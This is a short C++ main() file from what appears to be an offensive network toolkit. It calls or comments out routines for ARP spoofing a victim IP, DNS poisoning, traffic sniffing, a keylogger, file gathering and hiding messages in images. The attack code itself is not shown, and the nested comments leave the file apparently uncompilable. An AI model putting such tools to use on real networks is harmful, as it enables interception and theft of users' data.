//#define HAVE_REMOTE
#pragma warning
#include "arpspoof.h"
#include "SniffTraffic.h"
#include "Components.h"
#include "Components.h"
#include "DnsPoison.h"
#include <iostream>
#include <thread>
using namespace std;
//#include <tins/tins.h>


int main(int argc, char **argv)
{
	string s = GetAllFiles("");
	///StartKeyLogger("9424566856598230338382444694725700202565611145299903633832741711686036998898672914861818988267057745277510983787409582059076460315008218865533185957404603");
	HideMessageInPicture("http://www.freepngimg.com/download/facebook/10-2-facebook-png-image.png dir");
	/*Arpspoof a;
	bool retflag;
	int retval = a.SendArpReplayForSpoofing(retflag);
	if (retflag) return retval;
	SpoofVictim("192.168.43.161");



	//SniffTraffic st;
	//st.SniffByFilter();
	/*char filter[8] = "";
	SniffTraffic st(filter, 1000);
	st.Capture();*/
	DnsPoison* t = new DnsPoison(NULL, 100);
	t->Capture();
	system("pause");

	SniffTraffic st;
	st.SniffByFilter();*/
	system("pause");
	return 0;
}
